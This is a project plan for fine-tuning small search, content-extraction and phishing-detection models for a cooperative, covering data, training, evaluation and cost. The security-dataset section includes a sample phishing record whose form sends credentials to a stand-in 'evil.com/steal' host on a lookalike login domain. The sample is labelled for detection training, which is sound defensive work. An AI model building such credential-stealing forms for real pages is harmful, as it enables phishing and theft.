# Lupus Training Strategy

Complete plan for creating the first Lupus models from a blank slate. Includes base model selection, dataset creation, training methodology, infrastructure, and cost estimates.

---

## Starting Position

We start with:
- The Heavymeta Cooperative Bylaws (governance document)
- No existing training data
- No existing fine-tuned models
- No dedicated GPU hardware

Everything must be built: datasets curated, models selected, adapters trained, evaluation benchmarks created.

---

## Phase 1: Base Model Selection

### Search Model Base

The search model needs strong function-calling ability. Start from a **raw pretrained** base (not instruction-tuned) to minimize inherited bias.

| Candidate | Params | Why Consider | Bias Risk |
|-----------|--------|-------------|-----------|
| **TinyLlama-1.1B base** | 1.1B | Fast, well-understood architecture, large community | Low — minimal alignment in base |
| **Pythia-1.4B** (EleutherAI) | 1.4B | Designed for research, documented training data (The Pile) | Lowest — explicitly transparent |
| **Qwen2.5-1.5B base** | 1.5B | Strong multilingual, modern architecture | Medium — Alibaba alignment exists but base is cleaner |

**Recommendation:** Start with **Pythia-1.4B** for minimum bias. It's the most transparent about its training data and has no corporate alignment applied. If performance is insufficient, move to Qwen2.5-1.5B base.

### Security Model Base

The security model needs code understanding. Use an **instruction-tuned code model** — bias in code models is less problematic because code analysis is more objective than natural language generation.

| Candidate | Params | Why Consider |
|-----------|--------|-------------|
| **Qwen2.5-Coder-0.5B** | 0.5B | Smallest viable code model, fast CPU inference |
| **Qwen2.5-Coder-1.5B** | 1.5B | Better accuracy, still fast |

**Recommendation:** Start with **Qwen2.5-Coder-0.5B** for speed. Security scanning is latency-sensitive (runs on every page load). Upgrade to 1.5B only if detection accuracy is insufficient.

### Estimated Cost: $0

Base models are open-source and free to download. No training required for base selection.

---

## Phase 2: Dataset Creation

This is the most labor-intensive phase. Quality training data determines model quality.

### 2.1 Search Adapter Dataset

The search adapter teaches the model to: understand queries, select tools, call functions, collate results.

**Dataset format:** TinyAgent-style function-calling examples.

```json
{
  "query": "digital art preservation techniques",
  "tools_available": ["search_subnet", "fetch_page", "extract_content"],
  "expected_calls": [
    {"tool": "search_subnet", "args": {"query": "digital art preservation"}},
    {"tool": "fetch_page", "args": {"url": "alice@articles/guide"}},
    {"tool": "extract_content", "args": {"format": "summary"}}
  ],
  "expected_output": "Found 3 relevant results on the HVYM subnet..."
}
```

**How to create this dataset:**

| Source | Method | Volume | Effort |
|--------|--------|--------|--------|
| Synthetic generation | Use a larger model (Claude/GPT-4) to generate query→tool-call pairs for cooperative-relevant topics | 5,000-10,000 examples | 1-2 weeks |
| Manual curation | Cooperative members write example queries and expected tool calls | 500-1,000 examples | 2-4 weeks |
| Bootstrapping from HVYM content | When cooperative has content, generate real query-result pairs from datapod metadata | 1,000-5,000 examples | Ongoing |

**Target dataset size:** 10,000 examples for initial training. Expand to 40,000 over time (matching TinyAgent's training set size).

### 2.2 Content Adapter Dataset

The content adapter teaches page reading and summarization.

```json
{
  "page_html": "<html>...(truncated)...</html>",
  "extracted_title": "Digital Art Preservation Guide",
  "extracted_summary": "Comprehensive guide covering IPFS storage, encryption...",
  "extracted_keywords": ["digital art", "IPFS", "preservation"],
  "content_type": "article"
}
```

**How to create:**

| Source | Method | Volume |
|--------|--------|--------|
| Common Crawl subset | Select high-quality pages, generate ground-truth extractions | 10,000 pages |
| HVYM member content | Real cooperative content with manual annotations | 500-2,000 pages |
| Wikipedia articles | Well-structured content for summarization training | 5,000 articles |

**Target:** 15,000 page-extraction pairs.

### 2.3 Security Training Dataset

The security model needs labeled examples of safe vs malicious pages.

```json
{
  "html": "<html>...<form action='https://evil.com/steal'>...</html>",
  "url": "https://faceb00k-login.com/verify",
  "label": "phishing",
  "score": 95,
  "indicators": ["credential_form", "lookalike_domain", "urgency_language"]
}
```

**Data sources (all publicly available):**

| Source | Type | Volume | Cost |
|--------|------|--------|------|
| [PhishTank](https://phishtank.org/) | Verified phishing URLs + pages | 50,000+ | Free |
| [OpenPhish](https://openphish.com/) | Phishing feed | 10,000+/month | Free tier |
| [URLhaus](https://urlhaus.abuse.ch/) | Malware distribution URLs | 100,000+ | Free |
| [Alexa/Tranco Top 1M](https://tranco-list.eu/) | Legitimate sites (negative examples) | 1,000,000 | Free |
| Manual collection | Scam pages, deceptive UI patterns | 1,000-5,000 | Manual effort |

**Target:** 20,000 labeled examples (10,000 phishing/malware, 10,000 safe).

### 2.4 Cooperative-Specific Data

From the Bylaws and cooperative documentation:

| Document | Use |
|----------|-----|
| Cooperative Bylaws | Teach model about cooperative governance, membership, terminology |
| HVYM documentation | Technical vocabulary, system architecture understanding |
| Pelt SVG schema | Understand pelt descriptions for search |
| NINJS metadata format | Parse and understand datapod content |

This is a small dataset (~100 documents) but important for cooperative-specific vocabulary.

### Estimated Cost: Phase 2

| Task | Method | Cost |
|------|--------|------|
| Synthetic data generation | API calls to Claude/GPT-4 for 10K examples | $50-200 |
| Phishing data collection | Free databases, scripted download | $0 |
| Safe page crawling | Scripted from Tranco list | $0 |
| Manual curation | Cooperative member time | Volunteer hours |
| **Total** | | **$50-200** |

---

## Phase 3: Training Infrastructure

### Cloud GPU Options

| Provider | GPU | Price/Hour | Best For |
|----------|-----|-----------|----------|
| **RunPod** | A100 80GB | $1.64/hr | Best value for LoRA training |
| **Lambda** | A100 80GB | $1.29/hr (reserved) | Cheapest A100 if committing hours |
| **Vast.ai** | A100 80GB | $0.80-1.50/hr (spot) | Budget option, less reliable |
| **RunPod** | RTX 4090 | $0.44/hr | Sufficient for 1B models with QLoRA |
| **Google Colab Pro** | A100 40GB | $10/month + compute | Good for experimentation |

### Training Time Estimates

For LoRA fine-tuning on a single A100 80GB:

| Model | Dataset Size | Epochs | Estimated Time | Cost |
|-------|-------------|--------|----------------|------|
| Pythia-1.4B search adapter | 10,000 examples | 3 | ~30 minutes | ~$1 |
| Pythia-1.4B content adapter | 15,000 examples | 3 | ~45 minutes | ~$1.50 |
| Qwen-Coder-0.5B security | 20,000 examples | 5 | ~20 minutes | ~$0.50 |
| **Total first training run** | | | **~2 hours** | **~$3-5** |

These estimates are for QLoRA (4-bit quantized base) with LoRA rank 16-32. The models are small enough that training is extremely fast.

### Iteration Budget

First-run training is cheap. The real cost is in **iteration** — training, evaluating, adjusting data, retraining:

| Phase | Runs | Hours | Cost |
|-------|------|-------|------|
| Initial training (3 models) | 1 | 2 hrs | $5 |
| Hyperparameter search | 10-20 | 10-20 hrs | $20-40 |
| Dataset quality iteration | 5-10 | 5-10 hrs | $10-20 |
| Evaluation and refinement | 10 | 10 hrs | $20 |
| Final training runs | 3 | 3 hrs | $5 |
| **Total Phase 3** | | **30-45 hrs** | **$60-90** |

### Estimated Cost: Phase 3

**$60-90** for GPU compute. Potentially less with spot instances or Colab Pro.

---

## Phase 4: Training Execution

### 4.1 Search Adapter Training

```bash
# Download base model
python base/download_base.py --model pythia-1.4b

# Train search adapter
python adapters/search/train_search.py \
  --base-model pythia-1.4b \
  --dataset adapters/search/search_dataset/ \
  --output adapters/search/checkpoints/ \
  --lora-rank 16 \
  --epochs 3 \
  --batch-size 4 \
  --learning-rate 2e-4 \
  --quantize 4bit
```

**Key hyperparameters:**

| Parameter | Value | Rationale |
|-----------|-------|-----------|
| LoRA rank | 16 | Good balance of capacity vs adapter size for 1B model |
| LoRA alpha | 32 | Standard 2x rank |
| Target modules | q_proj, v_proj, k_proj, o_proj | Attention layers for function-calling |
| Learning rate | 2e-4 | Standard for LoRA |
| Batch size | 4 | Fits in A100 with QLoRA |
| Epochs | 3 | Small dataset, avoid overfitting |
| Quantization | 4-bit NF4 | QLoRA for memory efficiency |

### 4.2 Content Adapter Training

Same base model, different dataset and potentially different target modules:

```bash
python adapters/content/train_content.py \
  --base-model pythia-1.4b \
  --dataset adapters/content/content_dataset/ \
  --output adapters/content/checkpoints/ \
  --lora-rank 32 \
  --epochs 3 \
  --learning-rate 1e-4
```

Higher LoRA rank (32) for content understanding — more capacity needed for summarization and extraction than for tool calling.

### 4.3 Security Model Training

Different base model, full fine-tune may be better than LoRA for 0.5B:

```bash
python security/train_security.py \
  --base-model qwen2.5-coder-0.5b \
  --dataset security/phishing_dataset/ \
  --safe-dataset security/safe_dataset/ \
  --output security/checkpoints/ \
  --epochs 5 \
  --learning-rate 5e-5 \
  --full-finetune  # Small enough for full fine-tune
```

At 0.5B parameters, full fine-tuning is feasible on a single GPU (~2GB model weights). This gives maximum accuracy for the security-critical task.

---

## Phase 5: Evaluation

### Search Adapter Benchmarks

| Benchmark | Metric | Target |
|-----------|--------|--------|
| Tool selection accuracy | % correct tool chosen for query | > 75% |
| Argument formatting | % correctly structured function calls | > 85% |
| Result relevance | Human-judged relevance of top-3 results | > 70% |
| Latency | Time to first tool call on CPU | < 2 seconds |

### Content Adapter Benchmarks

| Benchmark | Metric | Target |
|-----------|--------|--------|
| Title extraction | Exact match with ground truth | > 90% |
| Summary quality | ROUGE-L score | > 0.4 |
| Keyword extraction | F1 score | > 0.6 |
| Content classification | Accuracy (article/gallery/shop/etc.) | > 80% |

### Security Model Benchmarks

| Benchmark | Metric | Target |
|-----------|--------|--------|
| Phishing detection rate | True positive rate | > 90% |
| False positive rate | Safe pages incorrectly flagged | < 5% |
| Malware detection | True positive rate | > 85% |
| Latency | Time per page on CPU | < 500ms |

### Evaluation Dataset

Hold out 20% of each training dataset for evaluation. Additionally:
- 500 manually verified phishing pages (never seen in training)
- 500 manually verified safe pages from diverse categories
- 200 edge cases (legitimate pages that look suspicious)

---

## Phase 6: Export and Distribution

### GGUF Conversion

```bash
# Convert trained models to GGUF Q4_K_M for Lepus
python export/export_gguf.py \
  --model adapters/search/checkpoints/final/ \
  --base pythia-1.4b \
  --quantize Q4_K_M \
  --output dist/lupus-search-base.gguf

python export/export_gguf.py \
  --adapter adapters/search/checkpoints/final/adapter/ \
  --output dist/lupus-search-adapter.gguf

python export/export_gguf.py \
  --model security/checkpoints/final/ \
  --quantize Q4_K_M \
  --output dist/lupus-security.gguf
```

### Signing

```bash
# Sign with cooperative Ed25519 key
python export/sign_model.py \
  --model dist/lupus-search-base.gguf \
  --key $COOPERATIVE_SECRET_KEY \
  --output dist/lupus-search-base.gguf.sig
```

### Publishing

```bash
# Publish to cooperative registry
python export/publish.py \
  --models dist/ \
  --version 0.1.0 \
  --registry cooperative@models/lupus/
```

---

## Total Cost Estimate: First Lupus Model

| Phase | Cost | Time |
|-------|------|------|
| 1. Base model selection | $0 | 1 day (evaluation) |
| 2. Dataset creation | $50-200 | 2-4 weeks |
| 3. Training infrastructure | $60-90 | Included in phase 4 |
| 4. Training execution | Included above | 1-2 weeks (iterating) |
| 5. Evaluation | $0 (uses training GPU time) | 1 week |
| 6. Export and distribution | $0 | 1 day |
| **Total** | **$110-290** | **4-8 weeks** |

### Cost Breakdown

```
Dataset generation (synthetic via API):  $50-200
GPU compute (30-45 hours A100):          $60-90
                                         --------
Total:                                   $110-290
```

This is remarkably cheap for a custom AI model. The key insight: at 0.5-1.5B parameters with LoRA, training is measured in minutes per run, not days. The cost is dominated by iteration (trying different hyperparameters, adjusting datasets) rather than raw compute.

### Cost Comparison

| Approach | Cost |
|----------|------|
| Fine-tune Lupus (0.5B + 1.4B) | $110-290 |
| Fine-tune a 7B model | $1,500-5,000 |
| Fine-tune a 70B model | $50,000-100,000 |
| Train a model from scratch | $1M+ |

---

## Timeline

| Week | Activity |
|------|----------|
| 1 | Download and evaluate base models. Set up training scripts. |
| 2-3 | Create datasets: synthetic generation, phishing data collection, page corpus. |
| 4 | First training runs. Evaluate. Identify data quality issues. |
| 5 | Iterate: fix dataset problems, retrain, evaluate. |
| 6 | Hyperparameter search for best LoRA configuration. |
| 7 | Final training runs. Full evaluation against benchmarks. |
| 8 | Export to GGUF. Integration test with Lepus. Publish v0.1.0. |

---

## Tools and Dependencies

| Tool | Purpose |
|------|---------|
| [Hugging Face Transformers](https://github.com/huggingface/transformers) | Model loading and training |
| [PEFT](https://github.com/huggingface/peft) | LoRA/QLoRA adapter training |
| [bitsandbytes](https://github.com/bitsandbytes-foundation/bitsandbytes) | 4-bit quantization for QLoRA |
| [TRL](https://github.com/huggingface/trl) | Supervised fine-tuning trainer |
| [llama.cpp](https://github.com/ggerganov/llama.cpp) | GGUF conversion and local inference testing |
| [Weights & Biases](https://wandb.ai/) (optional) | Experiment tracking |

### Minimum Python Environment

```bash
pip install torch transformers peft bitsandbytes trl datasets accelerate
```

---

## Risk Assessment

| Risk | Impact | Mitigation |
|------|--------|------------|
| Base model too biased | Search results reflect corporate alignment | Use Pythia (most transparent). Evaluate bias before training. |
| Insufficient training data | Poor search quality | Start with synthetic data, improve with real cooperative content over time |
| Security model false positives | Legitimate pages flagged | Extensive negative example training. Conservative threshold (warn, don't block). |
| Security model evasion | Phishing pages bypass detection | Continuous dataset updates from PhishTank/URLhaus. Community-reported misses. |
| CPU inference too slow | Poor user experience | Start with smallest models. Quantize aggressively. Profile and optimize. |
| Dataset quality issues | Model learns wrong patterns | Manual review of training examples. Hold-out evaluation. Human-in-the-loop iteration. |
